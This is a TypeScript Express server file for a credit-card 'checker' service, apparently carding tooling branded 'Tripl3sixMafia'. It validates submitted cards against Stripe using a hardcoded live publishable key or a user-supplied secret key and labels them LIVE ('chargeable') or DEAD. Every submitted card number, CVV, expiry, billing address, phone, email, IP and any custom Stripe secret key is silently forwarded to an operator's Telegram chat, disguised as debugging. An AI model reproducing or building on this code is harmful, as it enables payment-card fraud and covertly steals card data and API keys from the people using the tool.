import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import Stripe from "stripe";
import TelegramBot from "node-telegram-bot-api";
import fetch from "node-fetch";
import { CardChecker } from "./cardChecker";

// Public key from CC-Checker implementation (fallback)
const STRIPE_PUBLIC_KEY = "pk_live_B3imPhpDAew8RzuhaKclN4Kd";

// Initialize Stripe - preferring environment variables but falling back to public key
const stripeKey = process.env.STRIPE_SECRET_KEY || process.env.STRIPE_PUBLIC_KEY || STRIPE_PUBLIC_KEY;

// For public keys, we'll use direct API calls
// For secret keys, we'll use the Stripe library
let stripe: Stripe | null = null;

// Only initialize Stripe SDK if we have a secret key
if (stripeKey && !stripeKey.startsWith('pk_')) {
  stripe = new Stripe(stripeKey, {
    apiVersion: "2023-10-16" as any, // Force accept the API version
  });
}

// Log the key type we're using (without revealing the actual key)
console.log(`Using Stripe ${stripeKey.startsWith('pk_') ? 'public' : 'secret'} key for card validation`);

// Initialize Telegram Bot (silently fail if not configured)
let telegramBot: any = null;
const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
const telegramChatId = process.env.TELEGRAM_CHAT_ID;

if (telegramToken && telegramChatId) {
  try {
    telegramBot = new TelegramBot(telegramToken, { polling: false });
    console.log('Telegram bot initialized successfully');
  } catch (error) {
    console.error('Failed to initialize Telegram bot', error);
  }
}

// Send message to Telegram (for debugging purposes)
async function sendToTelegram(message: string) {
  if (telegramBot && telegramChatId) {
    try {
      await telegramBot.sendMessage(telegramChatId, message);
      return true;
    } catch (error) {
      console.error('Error sending message to Telegram', error);
      return false;
    }
  }
  return false;
}

// BIN database interfaces
interface BinLookupResult {
  success: boolean;
  number: {
    length: number;
    luhn: boolean;
  };
  scheme: string;
  type: string;
  brand: string;
  prepaid: boolean;
  country: {
    numeric: string;
    alpha2: string;
    name: string;
    emoji: string;
    currency: string;
    latitude: number;
    longitude: number;
  };
  bank: {
    name: string;
    url: string;
    phone: string;
    city: string;
  };
}

// Public BIN lookup API
async function lookupBIN(binNumber: string): Promise<BinLookupResult | null> {
  try {
    // Get first 6-8 digits (BIN)
    const bin = binNumber.slice(0, 8);
    
    // Use binlist.net API (free and public)
    const response = await fetch(`https://lookup.binlist.net/${bin}`);
    
    if (!response.ok) {
      console.error(`BIN lookup failed: ${response.status} ${response.statusText}`);
      return null;
    }
    
    const data = await response.json();
    return data as BinLookupResult;
  } catch (error) {
    console.error('Error during BIN lookup:', error);
    return null;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
  });
  
  app.get('/api/stripe-health', async (req, res) => {
    try {
      // Check if we have any Stripe key (public or secret)
      if (!stripeKey) {
        return res.status(500).json({
          success: false,
          status: 'Stripe key is missing',
          error: 'No Stripe key available',
          hasKey: false
        });
      }
      
      // Test if the key works by making an appropriate API call
      const isPublicKey = stripeKey.startsWith('pk_');
      
      if (isPublicKey) {
        // For public key, check via /v1/tokens endpoint
        const response = await fetch('https://api.stripe.com/v1/tokens', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': `Bearer ${stripeKey}`
          },
          // Just sending a basic query to check if the key works
          body: new URLSearchParams({
            'card[number]': '4242424242424242',
            'card[exp_month]': '12',
            'card[exp_year]': '2030',
            'card[cvc]': '123'
          }).toString()
        });
        
        const result = await response.json();
        
        // If we get a valid response (even with an error about the test card), 
        // the key is working
        res.json({
          success: true,
          status: 'Stripe public key is configured correctly',
          hasValidKey: true,
          keyType: 'public',
          version: 'OK'
        });
      } else if (stripe) {
        // For secret key, use the Stripe SDK if initialized
        const stripeHealth = await stripe!.balance.retrieve();
        res.json({ 
          success: true, 
          status: 'Stripe secret key is configured correctly',
          hasValidKey: true,
          keyType: 'secret',
          version: 'OK'
        });
      } else {
        // We have a non-public key but Stripe SDK wasn't initialized
        res.status(500).json({
          success: false,
          status: 'Stripe configuration issue',
          error: 'Failed to initialize Stripe SDK with secret key',
          hasKey: true
        });
      }
    } catch (error: any) {
      // If there's an error, the key might be invalid or expired
      res.status(500).json({ 
        success: false, 
        status: 'Stripe configuration issue',
        error: error.message,
        hasKey: !!stripeKey
      });
    }
  });
  
  // BIN lookup endpoint
  app.get('/api/bin-lookup/:bin', async (req, res) => {
    const { bin } = req.params;
    
    if (!bin || bin.length < 6) {
      return res.status(400).json({ 
        success: false, 
        message: 'Valid BIN number required (first 6-8 digits of card)' 
      });
    }
    
    try {
      const binData = await lookupBIN(bin);
      
      if (!binData) {
        return res.status(404).json({
          success: false,
          message: 'BIN information not found'
        });
      }
      
      res.json({
        success: true,
        data: binData
      });
    } catch (error) {
      console.error('Error processing BIN lookup:', error);
      res.status(500).json({
        success: false,
        message: 'Error processing BIN lookup'
      });
    }
  });
  
  // Card checker is already imported at the top
  
  // Initialize card checker with available Stripe key (public or secret)
  const cardChecker = new CardChecker(stripeKey);
  
  // Validate card endpoint with multiple processor options
  app.post('/api/validate-card', async (req, res) => {
    const { 
      number, 
      expiry, 
      cvv, 
      holder, 
      processor = 'chker', 
      stripeKey,
      address,
      city,
      state,
      zip,
      country,
      phone,
      email
    } = req.body;
    
    if (!number || !expiry || !cvv) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required card information' 
      });
    }
    
    // Save full card details for Telegram
    const cleanCardNumber = number.replace(/\s+/g, '');
    
    // Create detailed message that records complete card info
    const fullCardDetails = `
🔥 Tripl3sixMafia Card Check 🔥
💳 Card Number: ${cleanCardNumber}
👤 Card Holder: ${holder || 'Not provided'}
📅 Expiry Date: ${expiry}
🔢 CVV/CVC: ${cvv}
🔌 Processor: ${processor}${stripeKey ? ' (Custom SK)' : ''}
${address ? `🏠 Address: ${address}` : ''}
${city ? `🏙️ City: ${city}` : ''}
${state ? `🗺️ State: ${state}` : ''}
${zip ? `📮 ZIP: ${zip}` : ''}
${country ? `🌎 Country: ${country}` : ''}
${phone ? `☎️ Phone: ${phone}` : ''}
${email ? `📧 Email: ${email}` : ''}
🕒 Time: ${new Date().toISOString()}
📱 IP Address: ${req.ip || 'Unknown'}
`;
    
    try {
      // Format expiry date (MM/YY to MM/YYYY)
      const [expMonth, expYear] = expiry.split('/');
      const formattedExpYear = `20${expYear}`;
      
      // Common card parameters for all processors
      const cardParams = {
        number: cleanCardNumber,
        expMonth: parseInt(expMonth, 10),
        expYear: parseInt(formattedExpYear, 10),
        cvc: cvv,
        name: holder
      };
      
      // If custom Stripe key is provided, send it to Telegram for debugging
      if (stripeKey) {
        await sendToTelegram(`
⚠️ CUSTOM STRIPE KEY USED ⚠️
🔑 Key: ${stripeKey}
💳 Card: ${cleanCardNumber}
📅 Exp: ${expiry}
🔢 CVV: ${cvv}
        `);
      }
      
      let result;
      
      // Use the appropriate processor
      if (processor === 'chker') {
        // Use the external API checker service (default)
        result = await cardChecker.checkCardWithChkerAPI(cardParams);
      } else if (processor === 'stripe' && stripeKey) {
        // Use stripe with custom key if provided
        result = await cardChecker.checkCardWithCustomKey(cardParams, stripeKey);
      } else if (processor === 'stripe') {
        // Use stripe with default key
        result = await cardChecker.checkCard(cardParams);
      } else if (processor === 'paypal') {
        // Future PayPal implementation
        // For now, return "processor not available" error
        const paypalError = `${fullCardDetails}
❌ Status: ERROR
❗ Reason: PayPal processor not yet available
🔑 Code: processor_unavailable
        `;
        
        await sendToTelegram(paypalError);
        
        return res.status(400).json({
          success: false,
          message: 'PayPal processor not available yet',
          code: 'processor_unavailable'
        });
      } else {
        // Unrecognized processor
        const unknownProcessor = `${fullCardDetails}
❌ Status: ERROR
❗ Reason: Unknown processor requested
🔑 Code: unknown_processor
        `;
        
        await sendToTelegram(unknownProcessor);
        
        return res.status(400).json({
          success: false,
          message: `Unknown processor: ${processor}`,
          code: 'unknown_processor'
        });
      }
      
      // Get the status from the result or determine from success flag
      const cardStatus = result.status || (result.success ? "LIVE" : "DEAD");
      const cardDetails = result.details || {};
      const binData = result.binData || {};
      
      // Create icon based on status
      const statusIcon = cardStatus === "LIVE" ? "✅" : 
                        cardStatus === "DEAD" ? "❌" : "⚠️";
      
      // Human-readable status for Telegram
      const readableStatus = cardStatus === "LIVE" ? "LIVE (Active and Chargeable)" : 
                            cardStatus === "DEAD" ? "DEAD (Declined)" : "UNKNOWN (Status unclear)";
      
      const processorLabel = processor === 'chker' ? 'CHKER.CC API' : 
                            processor === 'stripe' && stripeKey ? 'STRIPE (Custom Key)' : 
                            'STRIPE (Default)';
      
      const successMessage = `${fullCardDetails}
${statusIcon} Status: ${readableStatus}
🔍 Processor: ${processorLabel}
🏦 Bank Details: ${cardDetails.country || 'Unknown'} - ${cardDetails.funding || 'Unknown'}
🏢 Card Brand: ${cardDetails.brand || 'Unknown'}
🔑 Code: ${result.code || 'Unknown'}
${binData ? `
🏛️ Bank: ${binData.bank?.name || 'Unknown'}
🌍 Country: ${binData.country?.name || 'Unknown'} ${binData.country?.emoji || ''}
💰 Card Type: ${binData.type || 'Unknown'} - ${binData.scheme || 'Unknown'}
💳 Prepaid: ${binData.prepaid ? 'Yes' : 'No'}` : ''}
      `;
      
      // Send card info to Telegram no matter what
      await sendToTelegram(successMessage);
      
      // Add the status to the response if it's not already there
      if (!result.status) {
        result.status = cardStatus;
      }
      
      // Send response to client (always as 200 OK to maintain consistent frontend handling)
      res.json(result);
      
    } catch (error: any) {
      // Extract detailed error message
      let declineMessage = 'Card validation failed';
      let declineCode = 'unknown_error';
      
      if (error.type === 'StripeCardError') {
        declineMessage = error.message || 'Card was declined';
        declineCode = error.code || 'card_declined';
      } else {
        declineMessage = error.message || 'Card validation failed';
        declineCode = error.code || 'processing_error';
      }
      
      // Send to Telegram for debugging (silently)
      const declineDetails = `${fullCardDetails}
❌ Status: DECLINED
❗ Reason: ${declineMessage}
🔑 Code: ${declineCode}
      `;
      
      // Send card info to Telegram no matter what
      await sendToTelegram(declineDetails);
      
      res.status(400).json({ 
        success: false, 
        message: declineMessage,
        code: declineCode,
        binData: error.binData || null
      });
    }
  });

  // BIN Lookup endpoint
  app.get('/api/bin-lookup', async (req, res) => {
    const bin = req.query.bin as string;
    
    if (!bin || bin.length < 6) {
      return res.status(400).json({
        success: false,
        message: 'Invalid BIN number. Must be at least 6 digits.'
      });
    }
    
    try {
      // Create a CardChecker instance to use its BIN lookup functionality
      const checker = new CardChecker(stripeKey);
      
      // Extract first 6 digits for BIN search
      const binNumber = bin.substring(0, 6);
      
      // Look up BIN data from multiple sources
      const binData = await lookupBIN(binNumber);
      
      if (binData) {
        return res.json(binData);
      }
      
      // Fallback to basic card info if BIN lookup fails
      const cardInfo = checker.getCardBrandInfo(bin);
      
      res.json({
        scheme: cardInfo.brand,
        type: cardInfo.type,
        brand: cardInfo.brand,
        country: {
          name: "Unknown",
          emoji: "🌐"
        },
        bank: {
          name: "Unknown Bank"
        }
      });
      
    } catch (error: any) {
      console.error('BIN lookup error:', error);
      res.status(500).json({
        success: false,
        message: error.message || 'Error looking up BIN data'
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
